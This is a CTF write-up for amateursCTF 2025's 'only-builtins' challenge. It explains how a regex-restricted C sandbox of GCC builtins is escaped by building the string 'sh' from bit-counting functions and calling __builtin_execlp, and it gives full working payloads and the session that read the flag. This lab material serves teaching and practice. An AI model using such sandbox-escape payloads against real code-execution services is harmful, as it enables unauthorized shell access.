---
title: "misc/only-builtins - amateursCTF 2025"
date: 2025-11-19
draft: false
description: "Write up for misc/only-builtins"
tags: ["CTF", "misc", "C", "builtins"]
showTableOfContents: true
---

This CTF overall felt goofy but this was a pretty fun misc chal.

The challenge was written by `cinabun`

[only-builtins.tar.gz](/writeups/only-builtins/only-builtins.tar.gz)

## Given Files
We're given the file `chal.py` which looks like this:
```py
#!/usr/bin/env python3

import tempfile
import subprocess
import re

src = input("")
if not re.match(r"^(?:__auto_type v\d+=__builtin_[a-z_]+\((?:v\d+(?:,v\d+)*)?\);)+$", src):
    print("only builtins")
    exit(1)

with tempfile.TemporaryDirectory(dir="/tmp/work") as tmpdirname:
    with open(f"{tmpdirname}/main.c", "w") as f:
        f.write(f"#include<stdio.h>\nint main(){{setvbuf(stdout,NULL,_IONBF,0);setvbuf(stdin,NULL,_IONBF,0);{src}}}")

    ret = subprocess.run(
        ["gcc", f"{tmpdirname}/main.c", "-o", f"{tmpdirname}/main"],
        capture_output=True,
    )
    if ret.returncode != 0:
        print("compilation error")
        exit(1)

    ret = subprocess.run(
        [f"{tmpdirname}/main"],
        stderr=subprocess.DEVNULL,
    )
    if ret.returncode != 0:
        print("runtime error")
        exit(1)
```

It reads input, then writes it to `<tmpdir>/main.c` if the input matches the regex, and runs it.

The file's gonna look like something like the following if it matches:
```c
#include<stdio.h>
int main(){{setvbuf(stdout,NULL,_IONBF,0);setvbuf(stdin,NULL,_IONBF,0);<src>}}
```
Taking a closer look at the regex

`^(?:__auto_type v\d+=__builtin_[a-z_]+\((?:v\d+(?:,v\d+)*)?\);)+$`

It'll only accept input that looks something like this

`__auto_type v<N>=__builtin_<func_name>(v<X>, V<Y> ...);`

repeating.

## Solving
It's clear that we have to somehow write a program with `only-builtins` that gets a shell.

At first I spent some time trying to basically make a pwn chal inside this challenge, but then I realized that stuff like `__builtin_stack_address() and __builtin_setjmp()` (setjmp was available) which my original plan revolved around (leaking libc and just pwning from within the binary) was not available on the gcc version being used (gcc 12. something) and I had to restart. 

Then by actually using **gcc-12** and reading what was available in *builtins.def* (RTFM, mine was somewhere in `/usr/lib/gcc/x86_64-pc-linux-gnu/12.4.0/plugin/include/builtins.def`), I found out that things like `__builtin_execve` existed. We also have functions like `__builtin_malloc` available (execve won't actually work, but I'll explain why later). However there isn't a way to read in from stdin, or open files, as far as I'm aware.

This site is pretty good for seeing what's available as well 

[https://gcc.gnu.org/onlinedocs/gcc/Built-in-Functions.html](https://gcc.gnu.org/onlinedocs/gcc/Built-in-Functions.html).

So now it's pretty clear what to do, create a buffer with our command, and send it to `execve` (actually uses `execlp`). This would mean we need all the characters in `/bin/sh` in different variables. Finding out how to make each number for each char is that annoying part here. This was good news because I don't do pwn lol.

We can get an initial varible by using `__builtin_huge_val()` which returns *inf*. To get a zero, this can be passed into `__builtin_popcount`, which returns the number of one bits in a value. Honestly I feel like `popcount(inf)` shouldn't return 0 but it does so we can get started on other values.

Another large constraint we have is that we can't do basic arithmetic. There are functions like `__builtin_add_overflow(type a, type b, type* res)`, but this can't be used because we can't get a compatible `type*` like `int*` (you can't reference + I think the only pointer you can get is `void*` from things like *malloc*, and you can't dereference it afaik, although you can technically memcpy values around so maybe something was possible this way but I couldn't find it). This means we have to get creative. Alot of other math stuff like `__builtin_fma` is also locked behind the linker flag `-lm`;

It took some testing, but some of the useful numeric operation functions we have available are:
- `__builtin_clz(type)`: count leading zeros (input of zero returns 31)
- `__builtin_clzimax(type)`: count leading zeros for imax (i64 here) (input of zero returns 63)
- `__builtin_ctz(type)`: count trailing zeros
- `__builtin_ctzimax(type)`: count trailin zeros for imax (i64)
- `__builtin_ffs(type)`: find first set bit
- `__builtin_popcount(type)`: count number of set bits

You'll notice that all of these are just counting bits in ints, so the max number we can get is 64, but we'd need the lowercase ascii letters around 100.

The last two super important arithmetic functions we're gonna use are 
- `__builtin_powi(int x, int y)`: x*y
- `__builtin_isacii(int x)`: x & 0x7f (might not need this technically, but it increases the number of valid chars you can get, memset should just write x % 256 anyways)

The way I was originally finding characters was manually with printfs, but you can easily script this to find the right solution. One thing I did find out is that you can't get a `b` or `n` for `/bin/sh`, which is really annoying, just unlucky ig. Technically did make the challenge easier though because it made me look find `execlp`, which just uses the PATH, so you just have to execute `execlp("sh", NULL);`. There just aren't any two numbers within 32-bit integers where `x**y & 0x7f in 'bBnN'`. I think this is also the case for alot more letters.

```c
    // these __builtin_abs are useless
	__auto_type v12=__builtin_ctz(__builtin_abs(__builtin_powi(v4,v6)));
	__auto_type v47=__builtin_clzimax(__builtin_abs(__builtin_powi(v4,v8))); // '/'
	__auto_type v7=__builtin_clz(__builtin_abs(__builtin_powi(v4,v12)));
	__auto_type v65=__builtin_toascii(__builtin_abs(__builtin_powi(v3,v16)));
	__auto_type v91=__builtin_toascii(__builtin_abs(__builtin_powi(v3,v19)));
	__auto_type v113=__builtin_toascii(__builtin_abs(__builtin_powi(v5,v4)));
	__auto_type v97=__builtin_toascii(__builtin_abs(__builtin_powi(v5,v8)));
	__auto_type v101=__builtin_toascii(__builtin_abs(__builtin_powi(v5,v9)));
	__auto_type v121=__builtin_toascii(__builtin_abs(__builtin_powi(v5,v10)));
	__auto_type v88=__builtin_toascii(__builtin_abs(__builtin_powi(v6,v3)));
	__auto_type v13=__builtin_clz(__builtin_abs(__builtin_powi(v6,v7)));
	__auto_type v87=__builtin_toascii(__builtin_abs(__builtin_powi(v7,v3)));
	__auto_type v71=__builtin_toascii(__builtin_abs(__builtin_powi(v7,v9)));
	__auto_type v105=__builtin_toascii(__builtin_abs(__builtin_powi(v19,v2))); //'i'
	__auto_type min_int=__builtin_abs(__builtin_powi(v30,v30));//'i'
	printf("%d\n", min_int);
__auto_type check=<whatever you want to check>;
	printf("checking: %llx, %.2f, %c\n", check, check, check);
	printf("toascii: %d, '%c'\n", __builtin_toascii(check), __builtin_toascii(check));
	printf("clz: %d, '%c'\n", __builtin_clz(check), __builtin_clz(check));
	printf("clzimax: %d, '%c'\n", __builtin_clzimax(check), __builtin_clzimax(check));
	printf("clrsb: %d, '%c'\n", __builtin_clrsb(check), __builtin_clrsb(check));
	printf("ctz: %d, '%c'\n", __builtin_ctz(check), __builtin_ctz(check));
	printf("ctzimax: %d, '%c'\n", __builtin_ctzimax(check), __builtin_ctzimax(check));
```

Now you just have to find how to get every character. To make this easier, you can just loop through integers and powi + & 0x7f them to determine what integers you need to make them the chars. You can also look for uppercase or lowercase because tolower() and toupper() exist.
```py
# cant make this too big or they're all out of bounds
for i in range(3000):
    for j in range(2, 300): 
        x = i**j & 0x7f
        if x < MAXINT and (chr(x) in "sh" or chr(x) in "SH"):
            print(i, j, x)

```

Since I had already found small numbers manually, it was pretty easy to just find what numbers to use in powi.

After get all the numbers you need in variables, you can just add this code to get a shell. It just copies *sh* to memory.
```c
__auto_type v200=__builtin_malloc(v3);
__auto_type v201=__builtin_memset(v200,v0,v3);
__auto_type v202=__builtin_memset(v200,v104,v2);
__auto_type v203=__builtin_memset(v200,v115,v1);
__auto_type v204=__builtin_execlp(v200,v0);
```


### Solution
My original looked like this. Just flatten out the lines and send to the remote.
```c
#include <stdio.h>

int main(){{
	setvbuf(stdout,NULL,_IONBF,0);
	setvbuf(stdin,NULL,_IONBF,0);
	int x = 0;
	printf("%p, %p\n", &x, &main);
	__auto_type v10000=__builtin_huge_val();
	__auto_type v0=__builtin_popcount(v10000);
	__auto_type v10001=__builtin_powi(v0, v0);
	__auto_type v31=__builtin_clz(v0);
	__auto_type v27=__builtin_clz(v31);
	__auto_type v1=__builtin_ffs(v27);
	__auto_type v63=__builtin_clzimax(v0);
	__auto_type v58=__builtin_clzimax(v63);
	__auto_type v59=__builtin_clzimax(v31);
	__auto_type v25=__builtin_clrsb(v31);
	__auto_type v30=__builtin_clrsb(v1);
	__auto_type v26=__builtin_clrsb(v27);
	__auto_type v1120700816=__builtin_powi(v25, v25);
	__auto_type v32=__builtin_ctz(v1120700816);
	__auto_type v5=__builtin_ctz(v32);
	__auto_type v29=__builtin_clz(v5);
	__auto_type v61=__builtin_clzimax(v5);
	__auto_type v28=__builtin_ctz(v5);
	__auto_type v1682742304=__builtin_powi(v5, v5);
	__auto_type v20=__builtin_clz(v1682742304);
	__auto_type v52=__builtin_clzimax(v1682742304);
	__auto_type v19=__builtin_clrsb(v1682742304);
	__auto_type v2=__builtin_ctz(v20);
	__auto_type v72677920=__builtin_powi(v2, v2);
	__auto_type v4=__builtin_abs(v72677920);
	__auto_type v10016=__builtin_powi(v2, v4);
	__auto_type v16=__builtin_abs(v10016);
	__auto_type v10256=__builtin_powi(v16, v2);
	__auto_type v256=__builtin_abs(v10256);
	__auto_type v8=__builtin_ctz(v256);
	__auto_type v3=__builtin_ctz(v8);
	__auto_type v10064=__builtin_powi(v8,v2);
	
	__auto_type v6=__builtin_ctz(v10064);
	__auto_type v243=__builtin_powi(v3,v5);
	__auto_type v115=__builtin_toascii(v243);

	__auto_type v1010=__builtin_powi(v4,v5);
	__auto_type v10=__builtin_ctz(v1010);
	__auto_type v104104=__builtin_powi(v10,v3);
	__auto_type v104=__builtin_toascii(v104104);

	__auto_type v200=__builtin_malloc(v3);
	__auto_type v205=__builtin_malloc(v4);
	__auto_type v206=__builtin_memset(v205, v0, v4);
	__auto_type v201=__builtin_memset(v200, v0, v3);
	__auto_type v202=__builtin_memset(v200, v104, v2);
	__auto_type v203=__builtin_memset(v200, v115, v1);
	__auto_type v204=__builtin_execlp(v200, v0);
	__builtin_trap(); // for debugging
}}
```

### Flag
This uses a more reduced down version that ill go into in the next section.
```
❯ nc amt.rs 33205
> __auto_type v7=__builtin_dwarf_sp_column();__auto_type v3=__builtin_popcount(v7);__auto_type v2=__builtin_popcount(v3);__auto_type v1=__builtin_popcount(v2);__auto_type v0=__builtin_ctzimax(v1);__auto_type v31=__builtin_clz(v0);__auto_type v5=__builtin_popcount(v31);__auto_type v243=__builtin_powi(v3,v5);__auto_type v115=__builtin_toascii(v243);__auto_type v1520875=__builtin_powi(v115,v3);__auto_type v42=__builtin_clrsb(v1520875);__auto_type v74088=__builtin_powi(v42,v3);__auto_type v104=__builtin_toascii(v74088);__auto_type v200=__builtin_malloc(v3);__auto_type v201=__builtin_memset(v200,v0,v3);__auto_type v202=__builtin_memset(v200,v104,v2);__auto_type v203=__builtin_memset(v200,v115,v1);__auto_type v204=__builtin_execlp(v200,v0);
cat /flag.txt
amateursCTF{0nly_bu1lt1ns_in_C_is_much_h4rder_th4n_in_pyth0n}
```

## Optimizing
So, I was able to find the numbers needed to get 104 and 115 (s and h) from only-builtins, but you can also expand this to every other function used to calculate a number. The idea is to start with an initial value, see what values you can get from that, and then continue with each value you havent checked yet. You end up created a graph that you can search through for the shortest path to getting each number you need.

I ended up writing a simple python script on my own to do this (not completely relying on LLMs for this part, only for implementing the stuff like clz, which it still did wrong because of undefined behaviour on zero).

```py
from typing import List, Set

MASK_64 = 0xFFFFFFFFFFFFFFFF
MASK_32 = 0xFFFFFFFF
BITS_64 = 64
BITS_32 = 32

def _ctz_64(n):
    n &= MASK_64
    if n == 0: return BITS_64
    count = 0
    while (n & 1) == 0:
        n >>= 1
        count += 1
    return count

def _ctz_32(n):
    n &= MASK_32
    if n == 0: return BITS_32
    count = 0
    while (n & 1) == 0:
        n >>= 1
        count += 1
    return count

def _clz_64(n, clrsb=False):
    n &= MASK_64
    if not clrsb:
        if n == 0: return BITS_64 - 1
    else:
        if n == 0: return BITS_64
    return BITS_64 - (n & MASK_64).bit_length()

def _clz_32(n, clrsb=False):
    n &= 0xffffffff
    if not clrsb:
        if n == 0: return BITS_32 - 1
    else:
        if n == 0: return BITS_32
    return BITS_32 - (n & MASK_32).bit_length()


BIT_FUNCTIONS_64 = {
    'popcount': lambda n: (n & MASK_64).bit_count(),
    
    'clz64': _clz_64,
    'clz': _clz_32,
    
    'ctz64': _ctz_64,
    'ctz': _ctz_32,
    
    'ffs': lambda n: _ctz_64(n) + 1 if (n & MASK_64) != 0 else 0,
    
    'clrsb': lambda n: (_clz_64((MASK_64 ^ n), True) - 1) if ((n >> (BITS_64 - 1)) & 1) else (_clz_64(n, True) - 1),
    'toascii': lambda n: n & 0x7f
}

def get_outs(val: int) -> Set[int]:
    global found
    res = set()
    for name, bit_func in BIT_FUNCTIONS_64.items():
        x = bit_func(val)
        res.add(x)
        #print(f"{name}: {bit_func(val)}")
    for f in found:
        x = val**f
        y = f**f
        if x < 2147483647:
            res.add(x)
        if y < 2147483647:
            res.add(y)

    return res

INIT = 0
depth = 2
values = {}
found = set({0})
outs = get_outs(INIT)
values[INIT] = {out for out in outs if out != INIT}
queue = []
for v in values[INIT]:
    queue.append(v)
print(queue, found)
while len(queue) != 0:
    v = queue.pop(0)
    print(v, queue)
    outs = get_outs(v)
    values[v] = outs
    for out in outs:
        if out not in found:
            queue.append(out)
            found.add(out)
    if 104 in found or 115 in found:
        break
    print(found)

print(values)
```

I then just pasted it to gemini to give me a more robust script that finds the shortest path. Along with some stuff to check different starting points. Although the only starting points i had were `x = huge_val() -> popcount(x) = 0` and `dwarp_sp_column() = 7`. I tried using `__builin_LINE() == 2`, but it didn't work because of caps. **dwarp_sp_column** ended up being the shortest with 18 total calls needed, 17 if you don't hope that your buffer is already null terminated (which I tested and it worked iirc).

The dwarf one looks like this:
```c
__auto_type v7=__builtin_dwarf_sp_column();__auto_type v3=__builtin_popcount(v7);__auto_type v2=__builtin_popcount(v3);__auto_type v1=__builtin_popcount(v2);__auto_type v0=__builtin_ctzimax(v1);__auto_type v31=__builtin_clz(v0);__auto_type v5=__builtin_popcount(v31);__auto_type v243=__builtin_powi(v3,v5);__auto_type v115=__builtin_toascii(v243);__auto_type v1520875=__builtin_powi(v115,v3);__auto_type v42=__builtin_clrsb(v1520875);__auto_type v74088=__builtin_powi(v42,v3);__auto_type v104=__builtin_toascii(v74088);__auto_type v200=__builtin_malloc(v3);__auto_type v201=__builtin_memset(v200,v0,v3);__auto_type v202=__builtin_memset(v200,v104,v2);__auto_type v203=__builtin_memset(v200,v115,v1);__auto_type v204=__builtin_execlp(v200,v0);
```

The huge_val looked like this:
```c
__auto_type v00=__builtin_huge_val();__auto_type v0=__builtin_popcount(v00);__auto_type v31=__builtin_clz(v0);__auto_type v5=__builtin_popcount(v31);__auto_type v2=__builtin_popcount(v5);__auto_type v4=__builtin_powi(v2,v2);__auto_type v3=__builtin_ffs(v4);__auto_type v243=__builtin_powi(v3,v5);__auto_type v115=__builtin_toascii(v243);__auto_type v1520875=__builtin_powi(v115,v3);__auto_type v42=__builtin_clrsb(v1520875);__auto_type v74088=__builtin_powi(v42,v3);__auto_type v104=__builtin_toascii(v74088);__auto_type v1=__builtin_powi(v104,v0);__auto_type v200=__builtin_malloc(v3);__auto_type v201=__builtin_memset(v200,v0,v3);__auto_type v202=__builtin_memset(v200,v104,v2);__auto_type v203=__builtin_memset(v200,v115,v1);__auto_type v204=__builtin_execlp(v200,v0);
```

Nicer looking ones here:
```c
#include <stdio.h>
int main(){{
setvbuf(stdout,NULL,_IONBF,0);
setvbuf(stdin,NULL,_IONBF,0);
__auto_type v7=__builtin_dwarf_sp_column();
__auto_type v3=__builtin_popcount(v7);
__auto_type v2=__builtin_popcount(v3);
__auto_type v1=__builtin_popcount(v2);
__auto_type v0=__builtin_ctzimax(v1);
__auto_type v31=__builtin_clz(v0);
__auto_type v5=__builtin_popcount(v31);
__auto_type v243=__builtin_powi(v3,v5);
__auto_type v115=__builtin_toascii(v243);
__auto_type v1520875=__builtin_powi(v115,v3);
__auto_type v42=__builtin_clrsb(v1520875);
__auto_type v74088=__builtin_powi(v42,v3);
__auto_type v104=__builtin_toascii(v74088);
__auto_type v200=__builtin_malloc(v3);
__auto_type v201=__builtin_memset(v200,v0,v3);
__auto_type v202=__builtin_memset(v200,v104,v2);
__auto_type v203=__builtin_memset(v200,v115,v1);
__auto_type v204=__builtin_execlp(v200,v0);
}}

#include <stdio.h>
int main(){{
setvbuf(stdout,NULL,_IONBF,0);
setvbuf(stdin,NULL,_IONBF,0);
__auto_type v00=__builtin_huge_val();
__auto_type v0=__builtin_popcount(v00);
__auto_type v31=__builtin_clz(v0);
__auto_type v5=__builtin_popcount(v31);
__auto_type v2=__builtin_popcount(v5);
__auto_type v4=__builtin_powi(v2,v2);
__auto_type v3=__builtin_ffs(v4);
__auto_type v243=__builtin_powi(v3,v5);
__auto_type v115=__builtin_toascii(v243);
__auto_type v1520875=__builtin_powi(v115,v3);
__auto_type v42=__builtin_clrsb(v1520875);
__auto_type v74088=__builtin_powi(v42,v3);
__auto_type v104=__builtin_toascii(v74088);
__auto_type v1=__builtin_powi(v104,v0);
__auto_type v200=__builtin_malloc(v3);
__auto_type v201=__builtin_memset(v200,v0,v3);
__auto_type v202=__builtin_memset(v200,v104,v2);
__auto_type v203=__builtin_memset(v200,v115,v1);
__auto_type v204=__builtin_execlp(v200,v0);
}}
```
